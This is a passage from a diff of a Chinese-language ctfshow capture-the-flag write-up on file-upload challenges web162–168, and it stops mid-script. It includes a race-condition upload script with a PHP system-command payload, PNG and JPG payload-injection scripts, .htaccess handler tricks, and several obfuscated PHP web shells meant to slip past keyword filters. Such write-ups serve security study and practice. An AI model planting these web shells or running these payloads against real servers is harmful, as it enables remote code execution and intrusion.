 <h2 id="web162（条件竞争或者远程文件包含）"><a href="#web162（条件竞争或者远程文件包含）" class="headerlink" title="web162（条件竞争或者远程文件包含）"></a>web162（条件竞争或者远程文件包含）</h2><blockquote>
 <h4 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h4><p>我们上传的文件如果不符合要求，就会被删除，导致成功上传无法访问，没有用。但是如果我们上传的速度比服务器删的速度快，就可以了。</p>
 <p>直接包含，注意<code>sess_</code>后面的内容是自己填的，要记住，跑脚本的时候会用到</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/20210202125238175.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/20210202125238175.png" class="" title="在这里插入图片描述">
 
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">sess = <span class="string">&#x27;abc&#x27;</span> <span class="comment">#之前上传时自拟的名字</span></span><br><span class="line">url1 = <span class="string">&quot;https://56d050ce-777f-4276-8ed7-5128f682341c.challenge.ctf.show/&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;https://56d050ce-777f-4276-8ed7-5128f682341c.challenge.ctf.show/upload&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line"><span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;yu22x tql&#x27;</span>  <span class="comment">#文件名，随便改就行</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(): <span class="comment">#上传文件竞争过程</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  r = session.post(url1, data=data1, files=file, cookies=cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>: <span class="comment">#每次竞争完都访问一下url/uoload看有没有flag</span></span><br><span class="line">  r = session.get(url2)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">      flag=re.<span class="built_in">compile</span>(<span class="string">&#x27;ctfshow&#123;.+&#125;&#x27;</span>) <span class="comment">#我在做题的时候flag格式已经改成ctfshow&#123;&#125;了</span></span><br><span class="line">      <span class="built_in">print</span>(flag.findall(r.text))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">     threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line"> t.start()</span><br></pre></td></tr></table></figure>
 
@@ -1601,11 +1601,11 @@
 </blockquote>
 <h2 id="web163（-user-ini包含）"><a href="#web163（-user-ini包含）" class="headerlink" title="web163（.user.ini包含）"></a>web163（.user.ini包含）</h2><blockquote>
 <p>按照上题的远程文件包含方法试试</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240531214122045.png" class="" title="image-20240531214122045">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240531214122045.png" class="" title="image-20240531214122045">
 
 <p>访问&#x2F;upload&#x2F;.user.ini，发现可以下载，而访问shell文件时发现不见了，说明被删掉了</p>
 <p>将.user.ini内容改为</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240531214532029.png" class="" title="image-20240531214532029">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240531214532029.png" class="" title="image-20240531214532029">
 
 <p>再访问upload，拿到flag</p>
 <p>或者依旧使用web162的方法，但是提前打开upload页面，上传shell文件之后立马刷新，就能避免被删（不知道为啥，删的不够快？）</p>
@@ -1616,26 +1616,26 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">        <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">        <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">        <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">        <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">        <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">        <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line"><span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line"><span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>将脚本运行得到的1.png上传，之后访问图片地址，使用BP抓包</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240602215939735.png" class="" title="image-20240602215939735">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240602215939735.png" class="" title="image-20240602215939735">
 </blockquote>
 <h2 id="web165（二次渲染jpg）"><a href="#web165（二次渲染jpg）" class="headerlink" title="web165（二次渲染jpg）"></a>web165（二次渲染jpg）</h2><blockquote>
 <p>使用上一题的方法，发现png无法成功了，换成jpg成功了，同样是使用大佬的脚本</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"> </span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>使用步骤即先将普通的jpg图片上传，然后将二次渲染之后的图片保存到本地，用脚本进行处理<code>php 脚本.php 图片.jpg</code>，后得到一个新的图片，上传这个图片即可</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240602230235257.png" class="" title="image-20240602230235257">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240602230235257.png" class="" title="image-20240602230235257">
 </blockquote>
 <h2 id="web166（zip上传）"><a href="#web166（zip上传）" class="headerlink" title="web166（zip上传）"></a>web166（zip上传）</h2><blockquote>
 <p>这题上传图片都不行，查看前端代码发现只能上传zip文件</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240603220222746.png" class="" title="image-20240603220222746">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240603220222746.png" class="" title="image-20240603220222746">
 
 <p>那么上传一个demo.zip文件，然后抓包修改文件内容，添加一句话木马</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240603222014671.png" class="" title="image-20240603222014671">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240603222014671.png" class="" title="image-20240603222014671">
 
 <p>注意：刚抓的包为GET请求，需要修改为POST的话，要在最后加一个Content-Type: application&#x2F;x-www-form-urlencoded</p>
 </blockquote>
 <h2 id="web167（-htaccess配置文件）"><a href="#web167（-htaccess配置文件）" class="headerlink" title="web167（.htaccess配置文件）"></a>web167（.htaccess配置文件）</h2><blockquote>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240603222730881.png" class="" title="image-20240603222730881">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240603222730881.png" class="" title="image-20240603222730881">
 
 <p>题目提示httpd，那么应该就是apache相关</p>
 <p>将AddType application&#x2F;x-httpd-php .txt写入.htaccess配置文件</p>
@@ -1643,51 +1643,51 @@
 <p>所以如果能上传这个文件，就不需要前面的文件包含漏洞来配合文件上传</p>
 <p>经过实验，这关没有什么过滤</p>
 <p>直接抓包把.htaccess和写有后门的1.txt上传上去</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240603224344364.png" class="" title="image-20240603224344364">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240603224344364.png" class="" title="image-20240603224344364">
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240603224303947.png" class="" title="image-20240603224303947">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240603224303947.png" class="" title="image-20240603224303947">
 </blockquote>
 <h2 id="web168（基础免杀）"><a href="#web168（基础免杀）" class="headerlink" title="web168（基础免杀）"></a>web168（基础免杀）</h2><blockquote>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240603224924697.png" class="" title="image-20240603224924697">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240603224924697.png" class="" title="image-20240603224924697">
 
 <p>上传png文件</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240603225026361.png" class="" title="image-20240603225026361">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240603225026361.png" class="" title="image-20240603225026361">
 
 <p>上传一句话，但是返回为null，将eval和$_POST的结构破坏后上传成功，过滤了关键词，后发现system、$_GET也无法使用</p>
 <p>下面是免杀脚本</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">脚本<span class="number">1</span>:</span><br><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_REQUEST</span>[<span class="number">1</span>]`;<span class="meta">?&gt;</span>    <span class="comment">//利用反引号执行系统命令</span></span><br><span class="line"> </span><br><span class="line">脚本<span class="number">2</span>:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]; </span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//a=system&amp;b=tac ../flagaa.php</span></span><br><span class="line"> </span><br><span class="line">脚本<span class="number">3</span>:</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="string">&#x27;syste&#x27;</span>.<span class="string">&#x27;m&#x27;</span>;(<span class="variable">$a</span>)(<span class="string">&#x27;ls ../&#x27;</span>);    <span class="comment">//拼接</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//把ls ../换成tac ../flagaa.php即可找到flag</span></span><br><span class="line"> </span><br><span class="line">脚本<span class="number">4</span>:</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;s#y#s#t#e#m&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;#&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span>[<span class="number">0</span>].<span class="variable">$b</span>[<span class="number">1</span>].<span class="variable">$b</span>[<span class="number">2</span>].<span class="variable">$b</span>[<span class="number">3</span>].<span class="variable">$b</span>[<span class="number">4</span>].<span class="variable">$b</span>[<span class="number">5</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span 